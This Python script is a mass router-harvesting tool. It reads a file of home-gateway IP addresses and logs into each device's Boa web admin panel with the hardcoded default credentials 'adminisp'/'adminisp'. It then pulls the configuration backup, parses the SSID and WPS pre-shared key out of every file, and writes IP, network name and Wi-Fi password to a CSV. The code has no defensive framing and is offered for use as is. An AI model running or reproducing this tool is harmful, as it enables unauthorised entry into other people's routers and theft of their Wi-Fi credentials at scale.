import os
import csv
import xml.etree.ElementTree as ET
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed


def send_login_request(ip):
    url = f"http://{ip}/boaform/admin/formLogin"
    headers = {
        # Your headers
    }
    data = {"username": "adminisp", "psd": "adminisp"}

    response = requests.post(url, headers=headers, data=data)
    response.raise_for_status()
    print(f"Login request sent successfully to {ip}")


def send_download_request(ip):
    url = f"http://{ip}/boaform/formSaveConfig"
    headers = {
        # Your headers
    }
    data = {"save_cs": "Backup..."}

    response = requests.post(url, headers=headers, data=data)
    response.raise_for_status()
    filename = f"{ip}.xml"
    folder_path = "home_xml"
    os.makedirs(folder_path, exist_ok=True)
    file_path = os.path.join(folder_path, filename)
    with open(file_path, "wb") as file:
        file.write(response.content)
    print(f"Downloaded file saved: {file_path}")


def main():
    with open("home_gateway.txt", "r") as file:
        ip_list = file.read().splitlines()

    with ThreadPoolExecutor() as executor:
        future_to_ip = {executor.submit(send_login_request, ip): ip for ip in ip_list}
        for future in as_completed(future_to_ip):
            ip = future_to_ip[future]
            try:
                future.result()
                send_download_request(ip)
            except requests.exceptions.RequestException as e:
                print(f"Failed to process {ip}: {str(e)}")


def parse_xml_files(directory):
    ssid_key_pairs = []

    for filename in os.listdir(directory):
        if filename.endswith(".xml"):
            file_path = os.path.join(directory, filename)

            tree = ET.parse(file_path)
            root = tree.getroot()

            ssid_element = root.find(".//Value[@Name='SSID']")
            keypassphrase_element = root.find(".//Value[@Name='WSC_PSK']")

            if ssid_element is not None and keypassphrase_element is not None:
                ssid = ssid_element.attrib["Value"]
                keypassphrase = keypassphrase_element.attrib["Value"]

                ssid_key_pairs.append((ssid, keypassphrase))

    return ssid_key_pairs


def save_to_csv(pairs, output_file):
    with open(output_file, "w", newline="") as file:
        writer = csv.writer(file)
        writer.writerow(["IP", "SSID", "KeyPassphrase"])
        writer.writerows(pairs)


if __name__ == "__main__":
    main()
    directory_path = "home_xml"
    output_file = "home_pass.csv"

    pairs = parse_xml_files(directory_path)

    ip_list = [
        file_name[:-4]
        for file_name in os.listdir(directory_path)
        if file_name.endswith(".xml")
    ]
    pairs_with_ip = [
        (ip, ssid, keypassphrase) for ip, (ssid, keypassphrase) in zip(ip_list, pairs)
    ]

    save_to_csv(pairs_with_ip, output_file)
